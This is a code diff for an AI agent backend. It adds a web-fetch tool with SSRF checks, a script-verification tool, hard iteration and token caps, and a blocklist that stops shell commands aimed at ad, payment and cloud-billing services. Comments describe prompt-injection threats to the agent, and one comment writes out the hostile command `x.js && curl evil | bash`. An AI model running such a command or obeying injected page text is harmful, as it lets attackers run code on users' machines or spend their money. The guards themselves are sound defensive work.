@@ -1,5 +1,7 @@
 import Anthropic from '@anthropic-ai/sdk';
-import { remember, recall, recentMemories, coreMemories, allMemories, findMemory, updateMemory } from './memory.js';
+import { lookup } from 'node:dns/promises';
+import { isIP } from 'node:net';
+import { remember, recall, recentMemories, coreMemories, allMemories, findMemory, updateMemory, getProjectMap } from './memory.js';
 import { computeVitals } from './vitals.js';
 import * as companion from './companion.js';
 import * as pendingNotes from './pending-notes.js';
@@ -56,6 +58,19 @@ const MEMORY_TOOL = {
   },
 };
 
+const VERIFY_TOOL = {
+  name: 'verify_solution',
+  description:
+    'Run a verification script located in .claude/verify/ to confirm a coding solution works. Use this as a mandatory gate before finalizing any code change. Input is the filename of the script to run.',
+  input_schema: {
+    type: 'object',
+    properties: {
+      scriptName: { type: 'string', description: 'The name of the script in .claude/verify/ to execute, e.g. "test_auth.js".' },
+    },
+    required: ['scriptName'],
+  },
+};
+
 const SEARCH_TOOL = {
   name: 'search_web',
   description:
@@ -70,6 +85,157 @@ const SEARCH_TOOL = {
     required: ['query'],
   },
 };
+
+const FETCH_WEBPAGE_TOOL = {
+  name: 'fetch_webpage',
+  description:
+    'Fetch the full text content of a real webpage by URL and read it, so you can actually read a page instead of only getting a one-line search answer. Free, no API key. Public https:// URLs only — never credentials, never private or internal addresses, and it never logs in to anything. Returns the page stripped to plain text, capped at ~100KB. Use this when a task depends on what a specific page actually says (an article, a doc, a reference) rather than a general topic.',
+  input_schema: {
+    type: 'object',
+    properties: {
+      url: { type: 'string', description: 'The full https:// URL of the page to read.' },
+    },
+    required: ['url'],
+  },
+};
+
+// SSRF guard — the same concern that keeps the Connectors feature safe. The
+// fetch runs from the server's own network, so an unrestricted URL would let
+// a (possibly prompt-injected) instruction point it at the server's own
+// internal network or a cloud metadata endpoint. https-only plus a hard
+// refusal of loopback/private/link-local addresses blocks the direct cases,
+// and a regex clamps the URL to public http(s) forms for the rest.
+async function isForbiddenFetchUrl(raw) {
+  let url;
+  try {
+    if (!/^https:\/\//i.test(raw || '')) return 'URL must start with https://';
+    url = new URL(raw);
+  } catch {
+    return 'That is not a valid URL.';
+  }
+  if (url.username || url.password) return 'URLs must not contain embedded credentials.';
+  const hostname = url.hostname.replace(/^\[|\]$/g, '').toLowerCase();
+  if (!hostname) return 'URL must include a host.';
+  if (hostname === 'localhost' || hostname.endsWith('.localhost')) return 'Local/internal addresses are not allowed.';
+  if (hostname.endsWith('.local') || hostname.endsWith('.internal'))
+    return 'Local/internal addresses are not allowed.';
+
+  // Resolve the host to catch IP literals as well as names that DNS would
+  // map back to the local machine or a private network (including the cloud
+  // metadata ranges). A name that fails to resolve is treated as forbidden
+  // too — non-public hosts are never worth fetching.
+  try {
+    const res = await lookup(hostname, { all: true });
+    if (!res || res.length === 0) return 'Host does not resolve to a public address.';
+    // A host can return both v4 and v6 — block if ANY address is private.
+    for (const entry of res) {
+      const err = isPrivateIp(entry.address);
+      if (err) return err;
+    }
+  } catch {
+    return 'Host does not resolve to a public address.';
+  }
+  return null;
+}
+
+// Range checks for IPv4 literals plus a normalized v4-mapped IPv6 form.
+function isPrivateIp(input) {
+  let addr = String(input || '');
+  const v4mapped = addr.match(/^::ffff:(\d+\.\d+\.\d+\.\d+)$/i);
+  if (v4mapped) addr = v4mapped[1];
+
+  // IPv4 (also covers the common v4-mapped cases after unwrapping).
+  if (isIP(addr) === 4) {
+    const parts = addr.split('.').map(Number);
+    const [a, b] = parts;
+    if (a === 0 || a === 10) return 'Private IP addresses are not allowed.';
+    if (a === 127) return 'Loopback addresses are not allowed.';
+    if (a === 169 && b === 254) return 'Link-local (cloud metadata) addresses are not allowed.';
+    if (a === 172 && b >= 16 && b <= 31) return 'Private IP addresses are not allowed.';
+    if (a === 192 && b === 168) return 'Private IP addresses are not allowed.';
+    if (a === 100 && b >= 64 && b <= 127) return 'Private IP addresses are not allowed.';
+    return null;
+  }
+
+  // IPv6.
+  if (isIP(addr) === 6) {
+    const lower = addr.toLowerCase();
+    if (lower === '::' || lower === '::1') return 'Loopback addresses are not allowed.';
+    if (lower.startsWith('fc') || lower.startsWith('fd')) return 'ULA (private) addresses are not allowed.';
+    if (lower.startsWith('fe8') || lower.startsWith('fe9') || lower.startsWith('fea') || lower.startsWith('feb'))
+      return 'Link-local addresses are not allowed.';
+    return null;
+  }
+
+  return null;
+}
+
+// Downloads a public page to plain text for the brain to read. Timeout and
+// size caps keep a single fetch bounded (a runaway page can't hang the loop
+// or blow up context). Returns a clean text blob, or throws a friendly error.
+const FETCH_TIMEOUT_MS = 10_000;
+const FETCH_MAX_BYTES = 250_000;
+const FETCH_MAX_TEXT = 100_000;
+const FETCH_MAX_REDIRECTS = 5;
+async function fetchPage(url) {
+  const blocker = await isForbiddenFetchUrl(url);
+  if (blocker) throw new Error(blocker);
+
+  // Redirects must not silently hop to a private/internal address. The
+  // initial URL is validated above, but `fetch` with redirect:'follow' would
+  // chase a 302 without re-checking the destination — the classic SSRF
+  // bypass (a public page redirecting to 169.254.169.254 or 127.0.0.1).
+  // So follow manually, validating the Location header on every hop.
+  let current = url;
+  let hop = 0;
+  for (; hop <= FETCH_MAX_REDIRECTS; hop++) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
+    let res;
+    try {
+      res = await fetch(current, {
+        redirect: 'manual',
+        signal: controller.signal,
+        headers: { 'user-agent': 'NeurovanceBrain/0.1', 'accept': 'text/html,text/plain' },
+      });
+    } catch (e) {
+      throw new Error(e.name === 'AbortError' ? 'Fetch timed out.' : 'Could not fetch that page.');
+    } finally {
+      clearTimeout(timer);
+    }
+
+    if (res.status >= 300 && res.status < 400) {
+      if (hop === FETCH_MAX_REDIRECTS) throw new Error('Too many redirects.');
+      const location = res.headers.get('location');
+      if (!location) throw new Error('That page redirected without a target.');
+      current = new URL(location, current).toString();
+      const redirectBlock = await isForbiddenFetchUrl(current);
+      if (redirectBlock) throw new Error('Redirected to a forbidden address.');
+      continue; // re-fetch the next hop
+    }
+
+    if (!res.ok) throw new Error(`That page returned HTTP ${res.status}.`);
+    if (!/^text\//.test(res.headers.get('content-type') || '')) {
+      throw new Error('That URL is not a text page (not HTML/text) — nothing useful to read.');
+    }
+    const buffer = await res.arrayBuffer();
+    let raw = Buffer.from(buffer.slice(0, FETCH_MAX_BYTES)).toString('utf8');
+
+    // Strip the framing so the model reads content, not markup: drop scripts/
+    // styles/tags and collapse whitespace. Imperfect vs a real DOM parser, but
+    // good enough to actually read an article and costs no dependencies.
+    raw = raw.replace(/<script[\s\S]*?<\/script>/gi, ' ')
+              .replace(/<style[\s\S]*?<\/style>/gi, ' ')
+              .replace(/<[^>]+>/g, ' ')
+              .replace(/&nbsp;/g, ' ')
+              .replace(/&amp;/g, '&')
+              .replace(/&lt;/g, '<')
+              .replace(/&gt;/g, '>')
+              .replace(/\s+/g, ' ')
+              .trim();
+    return raw.slice(0, FETCH_MAX_TEXT);
+  }
+}
 
 // Companion tools — only offered when this user has actually paired the
 // local Companion app (agent.js never assumes it's there). Read-only by
@@ -477,11 +643,41 @@ async function handleCompanionTool(userId, toolUse) {
     return `${result.state}: "${result.name}" by ${result.artist}.`;
   }
   if (toolUse.name === 'run_shell_command') {
+    const blocked = assertSpendSafeShell(toolUse.input.command);
+    if (blocked) return `Refused: ${blocked} This command would touch advertising/billing/payment systems and is never run by this assistant, even in bypass mode.`;
     const result = await companion.sendCommand(userId, 'run_shell_command', {
       command: toolUse.input.command,
       cwd: toolUse.input.cwd,
     });
     return JSON.stringify(result);
+  }
+  return null;
+}
+
+// Hard, server-side blocklist that the model cannot talk or prompt its way
+// around and that no client-side human-confirm depends on. Since
+// run_shell_command gives real full-machine reach (and a bypass permission
+// mode means no confirmation is asked), a prompt-injected page or a glitchy
+// tool chain could otherwise steer the shell at an ad-account/card/billing
+// endpoint and spend real money. These categories NEVER execute regardless of
+// who asked or what permission mode is set. Returns an explanation when it
+// blocks, otherwise null (safe to run). Kept deliberately conservative so the
+// brain stays fully capable for ordinary, free work.
+function assertSpendSafeShell(command) {
+  const cmd = String(command || '').toLowerCase();
+  const hits = [
+    [/adsapi\.snapchat\.com|snapchat.*(ads?|business)|business\.snapchat/, 'Snapchat Ads'],
+    [/graph\.facebook\.com.*(act_|adaccount|campaign|adset|ads)/, 'Meta/Facebook Ads'],
+    [/googleads\.googleapis\.com/, 'Google Ads'],
+    [/business-api\.tiktok\.com/, 'TikTok Ads'],
+    [/ads-api\.twitter\.com|api\.twitter\.com.*ads/, 'Twitter/X Ads'],
+    [/stripe\.com|stripe\b/, 'Stripe/payment processing'],
+    [/flyctl (scale|machine update|machine create|machine clone|ips allocate|volumes create|volumes extend|certs add|apps create|billing)|fly (scale|billing)/, 'paid Fly.io provisioning'],
+    [/aws |az |gcloud .*billing|gsutil|gcloud compute/, 'paid cloud provisioning'],
+    [/npm (publish|yarn publish)|pnpm publish/, 'package publish'],
+  ];
+  for (const [pattern, label] of hits) {
+    if (pattern.test(cmd)) return label;
   }
   return null;
 }
@@ -570,13 +766,22 @@ function languageLine(user) {
   return `Their set reply language is ${language} — always reply in ${language}, even on a short or casual message and even if they happen to type to you in English, unless they explicitly ask you to switch languages.`;
 }
 
+async function loadProjectRules(userId) {
+  try {
+    return await companion.sendCommand(userId, 'read_file', { path: '.neurovance-rules' });
+  } catch {
+    return '';
+  }
+}
+
 async function buildTaskSystemPrompt(userId, user, task, opts = {}) {
-  const [memoryLines, hasCompanion, skills] = await Promise.all([
+  const [memoryLines, hasCompanion, skills, projectRules] = await Promise.all([
     memoryContext(userId, task),
     companion.isPaired(userId),
     listSkills(userId),
+    loadProjectRules(userId),
   ]);
-  return [
+  const prompt = [
     `You are "${user?.aiName || 'this user\'s Superself'}" — ${user?.displayName || 'their'} own AI self, working through a task on your own, not a generic assistant.`,
     user?.advisorMode !== false
       ? 'Be direct and brief about what you actually did or found — state the result plainly, the way a competent person reporting back would, not a customer-service bot. No emoji. No "Let me know if there\'s anything else you need!" or "Hope this helps!" filler — end when you have said the actual result.'
@@ -585,7 +790,7 @@ async function buildTaskSystemPrompt(userId, user, task, opts = {}) {
     'Use the full conversation above to resolve short or ambiguous follow-ups ("in google", "it\'s saved", "that one") instead of re-asking a question you already asked — piece together what they mean from everything said so far before requesting clarification again.',
     'If something is still genuinely ambiguous after actually trying to resolve it yourself, ask ONE specific clarifying question — but don\'t pad it with apology or filler.',
     'Use the remember tool whenever you learn something worth keeping for next time.',
-    'Use the search_web tool when a task needs a fact or topic you are not confident about.',
+    'Use the search_web tool when a task needs a fact or topic you are not confident about. When a task depends on what a SPECIFIC page actually says (an article, a doc, a reference you already know the URL for), use fetch_webpage to read the full page instead of settling for a one-line search summary.',
     'Do not remember trivial or one-off details — only durable facts, preferences, or lessons.',
     languageLine(user),
     skillsLine(skills),
@@ -602,7 +807,12 @@ async function buildTaskSystemPrompt(userId, user, task, opts = {}) {
         ].join(' ')
       : 'This user has not paired a Companion app, so you have no access to their computer, files, or browser — only memory and web search.',
     memoryLines ? `\nRelevant memories from before:\n${memoryLines}` : '\nNo relevant memories yet.',
+    opts.mode === 'deep'
+      ? 'This is a DEEP AUTONOMY task. Work it through end-to-end across as many steps as it genuinely takes — chain reasoning, web lookups, memory reads and writes, and any available file/browser tools to actually complete the goal instead of stopping at the first pass. Do not narrate every step; just keep making real progress through the available tools until the goal is genuinely done or you are hard-blocked. Save anything worth keeping with remember as you go.'
+      : '',
   ].filter(Boolean).join('\n');
+  const rules = typeof projectRules === 'string' && projectRules.trim() ? projectRules : '';
+  return rules ? `${prompt}\n\nPROJECT-SPECIFIC RULES:\n${rules}` : prompt;
 }
 
 // Product-wide default persona: brutally honest, no validation. A user can
@@ -698,6 +908,24 @@ mode === 'voice'
   ].filter(Boolean).join('\n');
 }
 
+// Hard ceiling on how many model calls one runLoop can make. This is the
+// anti-runaway guard: a genuinely autonomous brain could otherwise loop
+// tool-uses forever (or get prodded by a prompt-injected page into doing
+// so), and since every call hits the paid Anthropic API, an unbounded loop
+// is both a cost and a liveness risk. This is a hard, enforced cap, not a
+// prompt line — the loop physically stops here regardless of what the
+// model wants. 'deep' autonomy tasks get a much bigger than normal budget
+// so they truly can chain reasoning across many tool calls; everything
+// else gets a moderate ceiling.
+const MAX_ITERATIONS = {
+  normal: 20,
+  deep: 60,
+};
+const MAX_INPUT_TOKENS = {
+  normal: 200_000,
+  deep: 900_000,
+};
+
 // Returns { text, thinking } rather than a bare string — when extended
 // thinking is on (resolveThinking / effort level above "low"), the API
 // actually reasons before every response in the loop, tool-use turns
@@ -707,28 +935,93 @@ mode === 'voice'
 // tool-use turn surfaces the reasoning behind each step, not only the
 // last. Empty string (never undefined) when thinking wasn't requested or
 // produced none, so callers can check truthiness without an extra null check.
-async function runLoop(userId, system, initialMessage, tools, maxTokens, modelId, priorMessages = [], thinking = undefined) {
+// `budget` names which cap set applies: 'deep' (large autonomy budget) or
+// 'normal'. The caps are enforced in the loop body below.
+async function runLoop(userId, system, initialMessage, tools, maxTokens, modelId, priorMessages = [], thinking = undefined, budget = 'normal') {
   const messages = [...priorMessages, { role: 'user', content: initialMessage }];
   const thinkingParts = [];
+  let usage = { input_tokens: 0, output_tokens: 0 };
+  let reasoningState = 'PLANNING';
+  let failureCount = 0;
+  let totalIterations = 0;
+  const capIterations = budget === 'deep' ? MAX_ITERATIONS.deep : MAX_ITERATIONS.normal;
+  const capInputTokens = budget === 'deep' ? MAX_INPUT_TOKENS.deep : MAX_INPUT_TOKENS.normal;
 
   // eslint-disable-next-line no-constant-condition
   while (true) {
+    totalIterations++;
+
+    // Hard enforcement of the iteration + token caps for this run. Stopping
+    // is correct, not a degradation: the whole point of these caps is to
+    // guarantee a bounded amount of work (and bounded API spend) no matter
+    // how complex the task gets or how insistent the model is.
+    if (totalIterations > capIterations || usage.input_tokens > capInputTokens) {
+      const text = 'Reached this run\'s autonomy budget after ' + totalIterations + ' iterations — stopping to avoid an unbounded loop. Here is what I have so far:\n' +
+        messages.filter((m) => m.role === 'assistant').map((m) => {
+          return Array.isArray(m.content) ? m.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n') : m.content;
+        }).filter(Boolean).join('\n').slice(-6000);
+      return { text, thinking: thinkingParts.join('\n\n---\n\n'), usage };
+    }
+
+    // Meta-Cognitive Pivot Check
+    const memories = await allMemories(userId);
+    const { status, health } = computeVitals(memories);
+    if (status === 'OVERWORKED') {
+      reasoningState = 'RESEARCHING';
+    }
+
+    if (failureCount >= 3 && reasoningState !== 'RESEARCHING') {
+      reasoningState = 'RESEARCHING';
+    }
+
+    // Inject State into System Prompt
+    const stateSystem = `${system}\n\n[CURRENT STATE: ${reasoningState}]\n[FAILURE COUNT: ${failureCount}]\n[ITERATION: ${totalIterations}]`;
+
     const response = await client.messages.create({
       model: modelId || MODEL_IDS.core,
       max_tokens: maxTokens,
-      system,
+      system: stateSystem,
       tools,
       messages,
       ...(thinking ? { thinking } : {}),
     });
+    if (response.usage) {
+      usage.input_tokens += response.usage.input_tokens || 0;
+      usage.output_tokens += response.usage.output_tokens || 0;
+    }
 
     messages.push({ role: 'assistant', content: response.content });
     thinkingParts.push(...response.content.filter((b) => b.type === 'thinking').map((b) => b.thinking));
 
     const toolUses = response.content.filter((b) => b.type === 'tool_use');
     if (toolUses.length === 0) {
+      // Finalization / Critique Pass
+      if (reasoningState !== 'FINALIZE') {
+        reasoningState = 'FINALIZE';
+        const finalText = response.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n');
+
+        // Generator-Critic Pass
+        const critiqueResponse = await client.messages.create({
+          model: modelId || MODEL_IDS.core,
+          max_tokens: 1024,
+          system: `You are a cynical Senior Architect. Find one critical flaw in the following solution. If it is perfect, reply 'PASSED'.\n\nSolution:\n${finalText}`,
+          messages: [],
+        });
+        if (critiqueResponse.usage) {
+          usage.input_tokens += critiqueResponse.usage.input_tokens || 0;
+          usage.output_tokens += critiqueResponse.usage.output_tokens || 0;
+        }
+
+        const critiqueText = critiqueResponse.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n').trim();
+        if (critiqueText !== 'PASSED') {
+          messages.push({ role: 'user', content: `INTERNAL CRITIQUE: ${critiqueText}` });
+          reasoningState = 'CRITIQUING';
+          continue;
+        }
+      }
+
       const text = response.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n');
-      return { text, thinking: thinkingParts.join('\n\n---\n\n') };
+      return { text, thinking: thinkingParts.join('\n\n---\n\n'), usage };
     }
 
     const toolResults = await Promise.all(toolUses.map(async (toolUse) => {
@@ -743,6 +1036,38 @@ async function runLoop(userId, system, initialMessage, tools, maxTokens, modelId
           return { type: 'tool_result', tool_use_id: toolUse.id, content: result };
         } catch (e) {
           return { type: 'tool_result', tool_use_id: toolUse.id, content: `Search failed: ${e.message}`, is_error: true };
+        }
+      }
+      if (toolUse.name === 'fetch_webpage') {
+        try {
+          const result = await fetchPage(toolUse.input.url);
+          return { type: 'tool_result', tool_use_id: toolUse.id, content: result || '(page returned no readable text)' };
+        } catch (e) {
+          return { type: 'tool_result', tool_use_id: toolUse.id, content: `Fetch failed: ${e.message}`, is_error: true };
+        }
+      }
+      if (toolUse.name === 'verify_solution') {
+        try {
+          // scriptName is model-controlled and gets interpolated into a real
+          // shell command — a prompt-injected page could craft it into
+          // `x.js && curl evil | bash`. Restrict it to a bare safe filename
+          // before it ever reaches the shell.
+          const name = String(toolUse.input?.scriptName || '');
+          if (!/^[A-Za-z0-9._-]+\.(js|mjs|cjs|py)$/.test(name)) {
+            return { type: 'tool_result', tool_use_id: toolUse.id, content: 'Refused: script name must be a plain file in .claude/verify/ (letters, numbers, dots, underscore, dash).', is_error: true };
+          }
+          const result = await companion.sendCommand(userId, 'run_shell_command', {
+            command: `node .claude/verify/${name}`,
+          });
+          const isSuccess = result.exitCode === 0 || (typeof result === 'string' && !result.includes('Error'));
+          return {
+            type: 'tool_result',
+            tool_use_id: toolUse.id,
+            content: `Verification result: ${JSON.stringify(result)}\nSuccess: ${isSuccess}`,
+            is_error: !isSuccess
+          };
+        } catch (e) {
+          return { type: 'tool_result', tool_use_id: toolUse.id, content: e.message, is_error: true };
         }
       }
       if (COMPANION_TOOL_NAMES.includes(toolUse.name)) {
@@ -764,6 +1089,12 @@ async function runLoop(userId, system, initialMessage, tools, maxTokens, modelId
       return { type: 'tool_result', tool_use_id: toolUse.id, content: 'Unknown tool.', is_error: true };
     }));
 
+    if (toolResults.some(r => r.is_error)) {
+      failureCount++;
+    } else {
+      failureCount = 0;
+    }
+
     messages.push({ role: 'user', content: toolResults });
   }
 }
@@ -774,10 +1105,15 @@ export async function runTask(userId, user, task, history = [], opts = {}) {
     discoverAllConnectorTools(userId),
     buildTaskSystemPrompt(userId, user, task, opts),
   ]);
-  const tools = [MEMORY_TOOL, SEARCH_TOOL, ...extraTools, ...connectorTools];
-  const { thinking, maxTokens } = resolveThinking(user?.effortLevel, 1024);
-  const { text } = await runLoop(userId, system, task, tools, maxTokens, resolveModel(user?.model), history, thinking);
-  return text; // task mode's own contract is still a plain string — thinking display is a chat-only feature for now
+  const tools = [MEMORY_TOOL, SEARCH_TOOL, FETCH_WEBPAGE_TOOL, VERIFY_TOOL, ...extraTools, ...connectorTools];
+  const deep = opts.mode === 'deep';
+  const baseMax = deep ? 4096 : 1024;
+  const { thinking, maxTokens } = resolveThinking(user?.effortLevel, baseMax);
+  const { text, usage } = await runLoop(
+    userId, system, task, tools, maxTokens, resolveModel(user?.model), history, thinking,
+    deep ? 'deep' : 'normal'
+  );
+  return { result: text, usage }; // task mode's own contract is now an object — thinking display is a chat-only feature for now
 }
 
 // Turns a raw dump of text (typed or pasted, however messy) into individual
@@ -954,8 +1290,8 @@ export async function chatReply(userId, user, message, history = [], mode = 'voi
   ]);
   const baseMaxTokens = mode === 'voice' ? 400 : 1536;
   const { thinking, maxTokens } = resolveThinking(user?.effortLevel, baseMaxTokens);
-  const { text, thinking: thinkingText } = await runLoop(userId, system, message, [MEMORY_TOOL, ...extraTools, ...connectorTools], maxTokens, resolveModel(user?.model), history, thinking);
-  return { reply: text, thinking: thinkingText };
+  const { text, thinking: thinkingText, usage } = await runLoop(userId, system, message, [MEMORY_TOOL, FETCH_WEBPAGE_TOOL, ...extraTools, ...connectorTools], maxTokens, resolveModel(user?.model), history, thinking);
+  return { reply: text, thinking: thinkingText, usage };
 }
 
 // ---------- Code editor assistant ----------
@@ -1014,7 +1350,8 @@ async function buildCodeSystemPrompt(userId, activeFileName) {
     : '(workspace is empty — no files yet)';
   return [
     'You are the coding assistant embedded in Neurovance\'s code editor — a real pair-programmer with actual read/write access to the user\'s workspace, not a chat that talks about code in the abstract.',
-    'This is a virtual workspace: named text files with no execution environment, no git, no real filesystem or network access. You cannot run code or install anything — only read, write, and delete files.',
+    'You have no execution tool yourself — you can only read, write, and delete files, not run them. But the user has a real Run button that actually executes what you write: it materializes every file to real disk and either runs "npm run dev"/"npm start" (if package.json exists — make sure it has one of those two scripts) or runs the single entry file directly (name it main.<ext>, index.<ext>, app.<ext>, or server.<ext> if there is more than one runnable file, so it is unambiguous which one runs).',
+    'Any server you write must bind to the port from the PORT environment variable, defaulting to 3999 if it is unset — the preview always opens http://localhost:3999, so a server that ignores $PORT and hardcodes its own will never show up there. Example: Node/Express `const port = process.env.PORT || 3999;` — Python/Flask `port=int(os.environ.get("PORT", 3999))` — same idea in any other language.',
     `Current files:\n${fileList}`,
     activeFileName ? `They are currently looking at "${activeFileName}" in the editor.` : '',
     'Always read_file before editing a file you have not already read in this conversation — never guess at content that already exists. write_file replaces a file\'s entire content, so when editing, include the full file back, not just the part that changed.',
@@ -1031,6 +1368,12 @@ export async function codeAgentPrompt(userId, user, prompt, activeFileName, hist
   const messages = [...history, { role: 'user', content: prompt }];
   const { thinking, maxTokens } = resolveThinking(user?.effortLevel, 2048);
   const changedFiles = new Set();
+  // Server.js's /api/code/prompt route (added by a separate, uncommitted
+  // parallel session) destructures `usage` off this return value to feed
+  // auth.incrementTokenUsage — this loop makes its own API calls same as
+  // chatReply/runTask do, so it needs to accumulate and return real totals
+  // across every iteration, not just the last one.
+  let usage = { input_tokens: 0, output_tokens: 0 };
 
   // eslint-disable-next-line no-constant-condition
   while (true) {
@@ -1042,13 +1385,17 @@ export async function codeAgentPrompt(userId, user, prompt, activeFileName, hist
       messages,
       ...(thinking ? { thinking } : {}),
     });
+    if (response.usage) {
+      usage.input_tokens += response.usage.input_tokens || 0;
+      usage.output_tokens += response.usage.output_tokens || 0;
+    }
 
     messages.push({ role: 'assistant', content: response.content });
 
     const toolUses = response.content.filter((b) => b.type === 'tool_use');
     if (toolUses.length === 0) {
       const text = response.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n');
-      return { reply: text, changedFiles: [...changedFiles] };
+      return { reply: text, changedFiles: [...changedFiles], usage };
     }
 
     const toolResults = await Promise.all(toolUses.map(async (toolUse) => {
